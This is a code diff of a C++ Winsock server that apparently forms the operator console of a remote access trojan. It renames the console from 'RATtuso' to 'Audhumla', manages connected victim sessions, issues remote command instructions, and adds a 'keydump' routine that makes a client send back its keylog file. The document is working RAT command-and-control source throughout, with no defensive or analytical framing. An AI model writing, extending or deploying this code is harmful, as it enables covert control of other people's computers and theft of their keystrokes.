@@ -1,14 +1,16 @@
-#include "server.h"
+#include "Server.h"
+#include <process.h>
 
 Server* Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
 
-
 Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on. BroadcastPublically = false if server is not open to the public (people outside of your router), true = server is open to everyone (assumes that the port is properly forwarded on router settings)
 {
-	//Sock Startup
-	if (sockInit() != 0) //If WSAStartup returns anything other than 0, then that means an error has occured in the WinSock Startup.
+	//Winsock Startup
+	WSAData wsaData;
+	WORD DllVersion = MAKEWORD(2, 1);
+	if (WSAStartup(DllVersion, &wsaData) != 0) //If WSAStartup returns anything other than 0, then that means an error has occured in the WinSock Startup.
 	{
-		std::cout << "WinSock startup failed\n";
+		MessageBoxA(NULL, "WinSock startup failed", "Error", MB_OK | MB_ICONERROR);
 		exit(1);
 	}
 
@@ -20,28 +22,25 @@ Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on
 	addr.sin_family = AF_INET; //IPv4 Socket
 
 	sListen = socket(AF_INET, SOCK_STREAM, NULL); //Create socket to listen for new connections
-	int enable = 1;
-	if (setsockopt(sListen, SOL_SOCKET, SO_REUSEADDR, (char*) & enable, sizeof(int)) < 0) {
-		std::cout << "setsockopt(SO_REUSEADDR) failed\n";
-		exit(1);
-	}
 	if (bind(sListen, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) //Bind the address to the socket, if we fail to bind the address..
 	{
-		std::cout << "Failed to bind the address to our listening socket\n";
+		std::string ErrorMsg = "Failed to bind the address to our listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
+		MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
 		exit(1);
 	}
 	if (listen(sListen, SOMAXCONN) == SOCKET_ERROR) //Places sListen socket in a state in which it is listening for an incoming connection. Note:SOMAXCONN = Socket Oustanding Max connections, if we fail to listen on listening socket...
 	{
-		std::cout << "Failed to listen on listening socket\n";
+		std::string ErrorMsg = "Failed to listen on listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
+		MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
 		exit(1);
 	}
 	serverptr = this;
-	General::createThread(PacketSenderThread); //Create thread that will manage all outgoing packets
+    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)PacketSenderThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
 }
 
 void Server::ListenForNewConnection()
 {
-	General::createThread(ListenerThread); //Create thread that will manage all outgoing packets
+    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ListenerThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
 }
 
 void Server::HandleInput()
@@ -51,7 +50,7 @@ void Server::HandleInput()
 	currentSessionID = -1;
 	while (true)
 	{
-		std::cout << "RATtuso console => ";
+		std::cout << "Audhumla console => ";
 		std::getline(std::cin, userinput);
 
 		if (currentSessionID == -1)			//handle command while not having selected a client
@@ -139,28 +138,18 @@ void Server::handleScript(std::string script)		//temporary, will implement clien
 	General::outputMsg("Executing script", 1);
 
 	SendString(currentSessionID, (std::string)"remoteControl cmd", PacketType::Instruction);
-	_sleep(2000);
+	Sleep(2000);
+	if (General::processParameter(script, "keydump"))
+	{
+		General::outputMsg("Dumping Keylogs from " + script, 1);
+		SendString(currentSessionID, "type " + script, PacketType::CMDCommand);
+	}
+	else
+	{
+		General::outputMsg("Script not recognized", 2);
+	}
 
 	SendString(currentSessionID, (std::string)"remoteControl", PacketType::Instruction);
-}
-
-int Server::sockInit()
-{
-#ifdef _WIN32
-	WSADATA wsa_data;
-	return WSAStartup(MAKEWORD(2, 1), &wsa_data);
-#else
-	return 0;
-#endif
-}
-
-int Server::sockQuit()
-{
-#ifdef _WIN32
-	return WSACleanup();
-#else
-	return 0;
-#endif
 }
 
 bool Server::ProcessPacket(int ID, PacketType _packettype)
@@ -275,9 +264,8 @@ bool Server::HandleSendFile(int ID)
 	return true;
 }
 
-void* Server::ClientHandlerThread(void* args) //ID = the index in the SOCKET connections array
+void Server::ClientHandlerThread(int ID) //ID = the index in the SOCKET connections array
 {
-	int ID = *(int*)args;
 	PacketType packettype;
 	while (true)
 	{
@@ -288,10 +276,10 @@ void* Server::ClientHandlerThread(void* args) //ID = the index in the SOCKET con
 	}
 	std::cout << "Lost connection to client ID: " << ID << std::endl;
 	serverptr->DisconnectClient(ID); //Disconnect this client and clean up the connection if possible
-	return nullptr;
+	return;
 }
 
-void* Server::PacketSenderThread(void* args) //Thread for all outgoing packets
+void Server::PacketSenderThread() //Thread for all outgoing packets
 {
 	while (true)
 	{
@@ -307,11 +295,11 @@ void* Server::PacketSenderThread(void* args) //Thread for all outgoing packets
 				delete p.buffer; //Clean up buffer from the packet p
 			}
 		}
-		_sleep(5);
+		Sleep(5);
 	}
 }
 
-void* Server::ListenerThread(void* args)
+void Server::ListenerThread()
 {
 	while (true)
 	{
@@ -344,7 +332,7 @@ void* Server::ListenerThread(void* args)
 				serverptr->connections.push_back(newConnection); //push new connection into vector of connections
 			}
 			std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(serverptr->addr.sin_addr) << std::endl;
-			General::createThread(ClientHandlerThread, (LPVOID)(&NewConnectionID)); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
+            _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
 		}
 	}
 }
@@ -359,11 +347,7 @@ void Server::DisconnectClient(int ID) //Disconnects a client and cleans up socke
 	}
 	connections[ID]->pm.Clear(); //Clear out all remaining packets in queue for this connection
 	connections[ID]->ActiveConnection = false; //Update connection's activity status to false since connection is now unused
-#ifdef _WIN32
 	closesocket(connections[ID]->socket); //Close the socket for this connection
-#else
-	close(connections[ID]->socket);
-#endif
 	if (ID == (connections.size() - 1)) //If last connection in vector.... (we can remove it)
 	{
 		connections.pop_back(); //Erase last connection from vector
